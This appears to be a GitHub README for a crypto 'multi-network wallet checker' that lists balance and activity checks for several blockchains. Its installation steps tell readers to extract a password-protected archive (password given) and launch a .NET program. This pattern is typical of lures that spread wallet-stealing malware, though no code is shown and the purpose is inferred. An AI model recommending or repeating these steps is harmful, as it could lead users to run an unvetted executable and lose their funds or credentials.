![alt text](https://github.com/ak1rahunt3r/multi-network-wallet-checker/blob/main/screen.png?raw=true)

## Installation
1. Clone/download repository and extract files with pass `rX4mtFaQ6i` to folder
2. Fill the files with addresses in the `addresses` folder
4. Install dependencies: .Net Framework 4.5
6. Launch program


### Web Server

Launches a local website to view all the statistics described below in the browser. It includes column sorting, highlighting low balances, and more.

### Activity Checker

### Network Checkers:
* ZkSync
* Starknet
* Layerzero
* Zora
* Aptos
* Linea

It will display the following information in the console and save it in a CSV file:
* Ether/Stablecoin balance
* Number of transactions
* Unique days/weeks/months
* First and last transactions
* Gas spent
* Chain-specific information

### Balance Retrieval

Shows the balance of native tokens/USDT/USDC/DAI in the selected network. Available networks: eth, arbitrum, optimism, polygon, bsc, avalanche.

### EVM Checker

* Number of transactions
* Unique days/weeks/months
* First and last transactions
* Gas spent

I recommend cloning this script rather than downloading the zip file, as it will be a universal tool for wallet management, and over time, it will include functionality for checking balances on EVM networks.

To use the EVM Checker, rename .env.example to .env and add your Moralis API Key.
